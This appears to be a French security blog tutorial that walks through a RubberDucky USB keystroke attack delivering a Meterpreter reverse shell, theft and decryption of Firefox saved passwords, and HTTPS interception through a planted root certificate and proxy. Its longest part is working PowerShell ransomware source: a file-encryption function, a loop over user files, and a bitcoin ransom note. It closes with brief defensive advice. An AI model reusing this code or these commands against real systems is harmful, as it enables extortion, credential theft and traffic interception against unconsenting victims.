+++
date = "2020-03-23T10:27:00+00:00"
draft = false
tags = ['securité']
title = "Yourlabs security"
author = "Claw"
+++


## [RubberDucky]({{<ref "#rubberducky" >}}) 
## [RansomWare]({{<ref "#ransomware" >}}) 
## [Man In The Middle SSL]({{<ref "#SSLmitm" >}}) 

---

## RubberDucky {#rubberducky}


### Fonctionnement

![](/img/sec/ducky.png)


Il ressemble à une clef usb d'apparence anodine mais il s'agit en realité d'un clavier scripté capable de tapper plus de 1000mots par minute.
Il contient une carte memoire qui contient notre script et marche très bien sur tout OS même à jour. 


### Objectifs

- desactiver les antivirus |
- configurer un proxy |
- démarrer un reverse shell |
- insertion de certificat d'autorité |
- démarrer des scripts powershell |
- tels qu'un ransomware |


Exemple de script RubberDucky:

```text
DELAY 700                        // Attendre 700 ms 
ESCAPE                           // Tapper Echap
DELAY 100                        // Attendre 100ms
CONTROL ESCAPE                   // Ouvrir le menu Démarer
DELAY 100
STRING Windows Security          // Tapper "Windows Security"
DELAY 200
...
```

### Compilation

![](/img/sec/comp.png)

Le compilateur est fournit en .jar c'est du java compilé et packagé:

- `-i` l'input
- `-l` l'output (doit tjs etre inject.bin)
- le plus important `-l` pour le langage du clavier


### Reverse shell

![](/img/sec/msfv.png)

Un reverse shell est un programme qui permet d'obtennir un acces distant pour executer des commandes.
Le but est de l'executer sur la machine de la victime pour qu'il se connecte a un shell qu'on a mit en ecoute de connection sur un serveur.

On utilise Msfvenom pour creer le payoad et Metasploit pour le server Meterpreter (cest sur celui ci que la victime va se connecter:
- `-a`: l'architecture CPU
- `--platform`: la plateforme (windows, android, nix...)
- `-p`: Le paylaod, dans ce cas meterpreter reverse_tcp
- `LHOST`: l'ip du server meterpreter
- `LPORT`: le port du server meterpreter
- `-e`: l'encoding
- `-f`: le format
- `>` /tmp/mad/666.exe: la destination

### Distribution

```bash
cd /tmp/mad && python -m http.server
# Sous ubuntu, debian... il faut utiliser python3 -m http.server
# car python = python2 sous ArchLinux python = python3
```

Une fois pret on utilise un petit server http pour que la victime puisse telecharger notre exe malvaillante

![](/img/sec/msf.png)


### Demo

[![](/img/sec/demoloosedoz.png)](https://yourlabs.io/oss/security/raw/master/assets/ducky-windoz.mp4)

[![](/img/sec/revshell.png)](https://yourlabs.io/oss/security/raw/master/assets/msf-reverseshell.mp4)

(clické sur les images pour voir les videos)

#### Conclusion: 

Ne ramassez pas les clefs usb que vous trouvez dans la rue

---

## Reverse shell

### Usages

- Vol de mots de passe firefox 
- Keylogger 
- Screen capture 
- Downloader et uploader des fichiers 
- Implementation d'un ransomeware 
- Reconnaissance et mouvement transversaux dans le reseau 
- ... 


### Vol de mots de passe Firefox

```powershell
meterpreter > shell
> powershell
> cd /users/<user> #(utilisez whoami pr le savoir)
> copy-item /users/33768/AppData/Roaming/Mozilla/Firefox/Profiles/*.default-release -destination /windows/temp/mad.default-release -recurse
> Compress-Archive -Path /windows/temp/mad.default-release -DestinationPath /windows/temp/mad.default-release.zip
> exit
> exit
meterpreter > Download /windows/temp/mad.default-release.zip /tmp
```

- [1] Lancer cmd)
- [2] Lancer powershell)
- [3] Copie des fichiers .default-release de firefox
- [4] Compression dans fichiers dans une archive zip
- [5-6] On exit 2 fois pour revenir au prompt `meterpreter >`
- [7] Exifltration de l'archive zip


### Extraction

Dans un autre terminal, on unzip et place les fichier dans le repetoir ~/.mozila/firefox

```bash
$ unzip mad.default-release.zip
$ sudo cp -r mad.default-release /home/<you>/.mozilla/firefox
$ sudo chown -R ${USER}. /home/<you>/.mozilla/firefox/mad.default-release
```

### Configuration

Par la suite on edite `~/.mozilla/firefox/profiles.ini avec le nouveau profile`

```text
[Profile2]
Name=default-release
IsRelative=1
Path=mad.default-release
```

### Dechiffrement

On utilise un outil appellé "[firefox-decrypt](https://github.com/Unode/firefox_decrypt/)":

```bash
$ git clone https://github.com/unode/firefox_decrypt.git
$ cd firefox_decrypt
$ python firefox_decrypt.py
```


### Resultat

![](/img/sec/password.png)


## Ransomware {#ransomware}

Un rançongiciel de l'anglais ransomware, logiciel de rançon ou logiciel d'extorsion, est un logiciel malveillant qui prend en otage des données personnelles.

- chiffrement symétrique des fichiers avec une clef aleatoire 
- chiffrement asymétrique de la clef avec un certificat public
- seul le détenteur du certificat privé dechiffrera la clef
- tout faire en mémoire pour ne laisser aucune trace sur le disque

Un ransomware peut aussi bloquer l'accès de tout utilisateur à une machine
jusqu'à ce qu'une clé ou un outil de débridage soit envoyé à la victime en
échange d'une somme d'argent. Les modèles modernes de rançongiciels sont
apparus en Russie initialement, mais on constate que le nombre d'attaques de ce
type a grandement augmenté dans d'autres pays, entre autres l'Australie,
l'Allemagne, les États-Unis.

- On va chiffrer le fichier avec du chiffrement symmetrique et utiliser de l'encryption asymmetrique pour encrypter la clée de cryptage...
- Seul ceui qui a le certificat privé poura decrypter la clé utilisée..
- Une encryption assymetrique pour tt encrypter prendrai trop de temps..

### Certificat

Note:
Un certificat électronique (aussi appelé certificat numérique ou certificat de clé publique) peut être vu comme une carte d'identité numérique. Il est utilisé principalement pour identifier et authentifier une personne physique ou morale, mais aussi pour chiffrer des échanges1.

Il s’agit également d’un concept très important pour tous ceux qui sont de véritables autorités en termes de sécurité informatique2.

Le standard le plus utilisé pour la création des certificats numériques est le X.509.


#### Generation

```powershell
$cert = New-SelfSignedCertificate `
        -DnsName $YOUR_NAME `
        -CertStoreLocation "Cert:\CurrentUser\My" `
        -KeyLength 3072 `
        -HashAlgorithm "Sha384" `
        -NotBefore ((Get-Date).AddDays(-1)) `
        -NotAfter (Get-Date -Year 2099 -Month 12 -Day 31) `
        -Type DocumentEncryptionCert `
        -KeyUsage KeyEncipherment, DataEncipherment
```


#### Export

```powershell
> Export-Certificate -Cert $cert -FilePath "cert.cer" | Out-Null
```


#### Texte

base64 permet de chiffrer le certificat en texte afin de pouvoir le copier plus facilement qu'en binaire

```
[Convert]::ToBase64String(
    [IO.File]::ReadAllBytes("/users/...../cert.cer")
)
```

#### Mot de passe

```psh
meterpreter > shell
> powershell
> Add-Type -AssemblyName System.web
> $pwd = [system.web.security.membership]::GeneratePassword(32,15)
> $cert = "MIIECDCCAnCgAwIBAgIQFTufS/aikLxCOTgoWoLnyDANBgkqhkiG9w0BAQwFADARMQ8wDQYDVQQDDAZteWNlcnQwIBcNMTkxMTI5MTUyODQ3WhgPMjA5OTEyMzExNTI4NDhaMBExDzANBgNVBAMMBm15Y2VydDCCAaIwDQYJKoZIhvcNAQEBBQADggGPADCCAYoCggGBAM/tJpom3ha8jKgtYzqoC2vIeJ/7xAHJ/B/q+FPS3ByhfsggnazOgMw+F6DIEnXG95wumlcF6e/M9gH2irUqwBIA0x2eDrGlH2k71ifE/iMe7TQBwe2uTDD0Vp3c6sFK6CMQOW3Ws30k2j+6E4KaUvdd52T5aYkYGCPj4MEe1noLy8t+GMDIT5bXw0TZluAGY6ExUVR8rN7AtsjBTcp9LWWw/5hlSZwDbMffYDdRlgm82QJedAYewyk6PwkjzcqsOdFV4Z8EmlIP2EM4Tnn6pHugJ3W5IIiRvNMVoPWiePBiThfR/npFnynqIDxJr973vdOjtCHBujTnU28nQfPqMb8E0lqlSeXskjZV176nuXB/1blvkNm0IYnJ/pm6i4p9mBjS0RoKlbPUg8iFcmtjjytQdjXDDtDpixyGcW/QfXyJFcfjl16A27QN3dNXEKYdhKhPSXM8zRedecpcvHl4t3iawW0EZlsFqzKlyjtr7zi5uj9nGHQajPBqNHrCXl6aJQIDAQABo1owWDAOBgNVHQ8BAf8EBAMCBDAwFAYDVR0lBA0wCwYJKwYBBAGCN1ABMBEGA1UdEQQKMAiCBm15Y2VydDAdBgNVHQ4EFgQUrwXEYlg0/q3ImayX6udhRvOTyt0wDQYJKoZIhvcNAQEMBQADggGBAHyM16X0efwFC2DwbbFT0RoFU9MLfEv1OrkaHFNPjn37p/53638o78dkBt28Hoi9LuGbN20dN7N0yu4W/cyFnuGjoz5zv2M9Tbipp+gO91jruxZmrXz6NSV/5jhAehZyP1MvVg1Nyub6n3WXkhekFQCmq0LORqBfgscwV2MNV1or2ThWCKRygrm3TgvuxPi5Wt40KrYTrp6VmVq39rXnfWJZD5oiCeIEI2OVf5BfFt1sgC4f2CQ2Ig/mjFrzzTtJWu5tNmJNknE8FIQN48LVsO7EFONXcx3VQ/WNO7Efo17BUCYl+CPNcYDMLWP/oKA/Hdbv4OTLcBbpiO0nNB1USn1YPASypVcXGC9y9Z6APBtrN4oVFY3yiuScXFjIm/fCWZN5IYpwIv3WuRG+p+X2ZE9Gw2GgeQCdpBXaS/YDix0oFHI3sRtmmUs0oKjbQEsEOgyOYnd65k5PK2Fcb/Rph0X+G97ErvOqlvhvfnvX0AosdCHnneYoBy0IcZYji2reAA=="
> $cert =  [IO.File]::WriteAllBytes("/windows/temp/x.cer", [Convert]::FromBase64String($cert))
> echo (Protect-CmsMessage -Content $pwd -To "/windows/temp/x.cer") > /users/$env:USERNAME/desktop/encrypted_key.txt
```

- [1-2] Lancer powershell depuis notre session meterpreter
- [3-4] Creer un mot de passe random
- [5] Notre certificat public en base64
- [6] Décodage du certificat dans un fichier
- [7] Sauvegarde du mot de passe chiffré avec le certificat public


#### Chiffrement de fichier


Fonction de chiffrement d'un fichier:

```powershell
Function Encr{param([string]$i,[string]$p)
  process{
    [System.Security.Cryptography.AesCryptoServiceProvider]$a=[System.Security.Cryptography.AesCryptoServiceProvider]::new()
    $a.BlockSize=128
    $a.KeySize=256
    $a.Mode=[System.Security.Cryptography.CipherMode]::CBC
    $a.Padding=[System.Security.Cryptography.PaddingMode]::PKCS7
    $a.GenerateIV();[byte[]]$IV=$a.IV;[byte[]]$k=[system.Text.Encoding]::UTF8.GetBytes($pwd)
    [System.IO.FileStream]$fout=[System.IO.FileStream]::new($i+".MAD_666",[System.IO.FileMode]::Create)
    [System.Security.Cryptography.ICryptoTransform]$IC=$a.CreateEncryptor($k,$IV)
    [System.Security.Cryptography.CryptoStream]$CS=[System.Security.Cryptography.CryptoStream]::new($fout, $IC, [System.Security.Cryptography.CryptoStreamMode]::Write)
    [System.IO.FileStream]$fin=[System.IO.FileStream]::new($i,[System.IO.FileMode]::Open)
    $fout.Write($IV,0,$IV.Count)
    $DA=$true;[int]$D
    While ($DA){
      $D=$fin.ReadByte()
      if($D -ne -1){
        $CS.WriteByte([byte]$D)
      }
      else{
        $DA = $false
      }
    }
    $fin.Dispose();
    $CS.Dispose();
    $fout.Dispose()
  }
}
```
Boucle pour encrypter tout les fichiers:

```powershell
foreach ($i in
    $(Get-ChildItem /users/$env:USERNAME -recurse -include *.txt,*.jpg,*mp3 | ForEach-Object { $_.FullName })
  ){
  Encr -i $i -p $pwd
  $size = [math]::round(((Get-Item $i)).length/4)+1
  $str = "hack" * $size
  echo $str > $i
  rm $i
}
```

Effacer la variable de mot de passe:

```powershell
> remove-variable pwd
```

Instructions pour la victime:

```psh
> $email = 'mon@email'
> $btc = ''
> echo "Send 0.1 btc to this account: $btc
After that, for the decryption keys and instructions for how to retrieve your files
send the content of the encrypted_keys and a proof of payment to this email:
$email" > /users/$env:USERNAME/desktop/README.txt
```

- [1] Email de l'attaquant pour envoyer la clef chiffrée
- [2] Addresse BitCoin pour recevoir le paiement
- [3] Message sur le bureau


#### Fond d'écran facultatif

```psh
> $img = 'http://xxx.xxx.Xxx/xxx.jpg'
> Invoke-WebRequest -Uri $img -OutFile "/users/$env:USERNAME/img.jpg"
> Set-ItemProperty -path 'HKCU:\Control Panel\Desktop\' -name wallpaper -value "/users/$env:USERNAME/img.jpg"
> rundll32.exe user32.dll, UpdatePerUserSystemParameters
```

- [1] Définir l'URL de l'image du fond d'écran
- [2] Télecharger l'image
- [3] Définir le chemin de l'image à utiliser en fond d'écran
- [4] Appliquer le nouveau fond d'écran


Redémarrer:

```psh
> restart-computer -force
```


### Déchiffrement du mot de passe

La victime va envoyer la clée encrypter avec le certificat public, pour la decrypter.
Sur la machine de l'attaquant, avec le certificat privé

```psh
> Unprotect-CmsMessage -path .../encrypted_key.txt
```

### Libération

```psh
$pwd = '' # Le password decrypté

function Decr{
  param([string]$i,[string]$p)
  process {
    $out = $i -replace ".{7}$"
    [System.IO.FStream]$FileStreamIn = [System.IO.FileStream]::new($i,[System.IO.FileMode]::Open)
    [byte[]]$IV = New-Object byte[] 16; $FileStreamIn.Read($IV, 0, $IV.Length)
    [System.Security.Cryptography.AesCryptoServiceProvider]$Aes =  [System.Security.Cryptography.AesCryptoServiceProvider]::new()
    $Aes.BlockSize = 128; $Aes.KeySize = 256; $Aes.Mode = [System.Security.Cryptography.CipherMode]::CBC
    $Aes.Padding = [System.Security.Cryptography.PaddingMode]::PKCS7
    [byte[]]$Key = [system.Text.Encoding]::UTF8.GetBytes($Password)
    [System.IO.FileStream]$FileStreamOut = [System.IO.FileStream]::new($out,[System.IO.FileMode]::Create)
    [System.Security.Cryptography.ICryptoTransform]$ICryptoTransform = $Aes.CreateDecryptor($Key,$IV)
    [System.Security.Cryptography.CryptoStream]$CryptoStream = [System.Security.Cryptography.CryptoStream]::new($FileStreamIn, $ICryptoTransform, [System.Security.Cryptography.CryptoStreamMode]::Read)
    $DataAvailable = $true; [int]$Data
    While ($DataAvailable){
      $Data = $CryptoStream.ReadByte()
      if($Data -ne -1){
        $FileStreamOut.WriteByte([byte]$Data)
      }
      else{
        $DataAvailable = $false
      }
    }
    $FileStreamIn.Dispose()
    $CryptoStream.Dispose()
    $FileStreamOut.Dispose()
  }
}
```

### Boucle

On envoie par mail a la victime le script qu'il devra copier-coller dans powershell...

```powershell
# On loop et decrypte les fichiers avec l'extention ".LCK_666"
foreach ($i in $(Get-ChildItem /users/$env:USERNAME -recurse -include *.LCK_666 | ForEach-Object { $_.FullName })){
  Decr -i $i -p $pwd
  rm $i
}
```

#### Conclusion

- pas besoin de vulnérabilité logicielle 
- si ce n'est l'accès physique
- négligence, lockpicking, social engineering ...
- necessite compétences variées et combinées


## SSL mitm {#SSLmitm}

Les connections en http (port 80) ne sont pas crypter, il est donc facile de le sniffer..
En revanche les connection en https (port 443, avec le petit cadenas) sont crypté avec ssl (Secure Socket Layer) qui utilise rsa (encryption asymetrique, comme pour notre petit ransomeware)

Dans cet exemple on va inserer un certificat dans le trust root ca store.
On va egalement canger les network settings afin d'ajoutter un proxy pr que le traffic passe par notre mitmproxy server


#### Setup

On encoder le certificat publique du mitmproxy (celui au format p12) en base64 (celui de windows) avec:

```psh
powershell> $b64str = [Convert]::ToBase64String([IO.File]::ReadAllBytes($certificatPath))
```

On cree un fichier txt pour le rubberducky:

```text
STRING [IO.File]::WriteAllBytes('C:/Windows/Temp/cert.p12', [Convert]::FromBase64String("MIIEcAIBAzCCBDoGCSqGSIb3DQEHAaCCBCsEggQnMIIEIzCCBB8GCSqGSIb3DQEHBqCCBBAwggQMAgEAMIIEBQYJKoZIhvcNAQcBMBwGCiqGSIb3DQEMAQMwDgQIKn7/Eg6FTsMCAggAgIID2Jb5bLWzZkMoSQu7/X+KOo03XiM4XoFZn3qX7ezbW88mnXE8DNZmp58NYNL8QtF3htkTluzAG+k9YXkzuygt1FcpaJIq/iNO0KpNvZURoQhvF93IbIyPT50pYS0hpXep9prbyxQdzoLgAncPAsjU/ExS+1xrVuy3Jx1LY3npa+0svCJO9QQC3EDrSzb6xbNvk9hF5SGhhecACuQPmbTj6zjbXVq7hmaj7sneMXihPId5R/QOcF+ctIqMUM6HpMtbTrIjhALPkVjyaLx0fL+JJi3fIUCqoTCY1NRPlWH5DJAwc3Z0efd3ij8/UzuoJqdB3mL3ketmTETQyRq24P+p4P1LHIPe+jAuozHUkVRRCKcS0OEhF9XH9BPw1iSK0Iqq7pNiUdkLH7402ypjTo3L/FXFqeu/MgPvYOtHyixqyB8gDQ+5xTzYzKTAB76v5PkG61ix0IunSFffvtfy0DEuAbv2jUt6wxrYfx1mNsUzUpQAVWLB97d3IPNQDGcYxiKf2UeLGF3IY5mF2qkain4I/bHY0Jj/iDmuy7Gtpx78MbjeQ+vEEdotj9HNVgWaM/Filyf5yvsZKJN1FVTfAbqqGgV4QoT/7wjZjyYWQHqkwNXnls2ZaefHqRBW64OBHMCd9T8WR/9JU06cEhXZfjnQlQIdeZXWsQSFIVaZavAkxavqYD3zdRWA97qRtGo6rnWQUm0b6o11t/dBzsxqqcHhiJ+SpTokRSLtuG9S1Wa040dBUWr3WucBhwTotzWVihDuhZfxUu7MOJtVZnSJpHKEE/MkvNPjVv9TdG0y/ntLaYLhOcl2eKo+OpEfxZm+vDPwj+c6HDh7+3sUsb6nIiE5pUj6udOMYgnq/RA8vYClGvL0o2XsW+KOasoqvr4/e1GihurcRvubusXE/IftH5XvmBHlPSm8R3tupSp02+RZTV7ct+Rw5AM/XVLwXuj4vTAxOXCL/KvdS/HbzeE7L8pxGBhLdeluNV6MpXGdog/Rs8MmAemAxeuMXH+xbux6lgPTLJI8Rm27poQVSPTxN8oQu742CuDkym3lCneS5XR8Zmd0Dnt4OwXVsjc5HykLEFUXutsNUv1BzKXjGknv5FRpIEZ5pIlmf8Nk+Q3urfk/o7Sxug297KTHb61ZgzpiwgCT/R7QV0ZOghNwk/ZnMil5eDY+mHNhBI988wancioLIeC+lK579WUTmTGpO4z10K4A++n8nLSI/P2LG/LoaI+jdLDl3AkKGvu1tqE15FeIe2xLCBYWAVjdq+QwfmaRThHpItcuK01B5DMX2nB66bCy8t2e93i2bRPlhzAtMCEwCQYFKw4DAhoFAAQUUj8Qkw1qHfkW3K+fjyn2nPnhUrMECJdQ7sNKJQNK"))

DELAY 800
ENTER
STRING Start-Process "C:/Windows/Temp/cert.p12"
```

Pour ajouter l'addr et le port du server proxy et l'active:

```psh
STRING $reg = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Internet Settings"; Set-ItemProperty -Path $reg -Name ProxyServer -Value "192.168.1.19:8080";Set-ItemProperty -Path $reg -Name ProxyEnable -Value 1
DELAY 300
ENTER
```

On compilez le script avec `java -jar -i mitm.txt -o inject.bin -l fr` et inserez le das le ducky rubber


#### L'attaque

On lance le mitmproxy avec

```bash
mitmproxy
```

On plug la clée usb et apres 20 seconde, voila le resultat

![img](/img/sec/mitm.png)

Les communications se font toujours en https, mais nous sommes maintenant capable de les voire en claires  :)

#### Conclusion

- Toujours verrouiller sa session quand l'on s'absente
- Ne jamais installer de certificats sans connaintre sa provenance
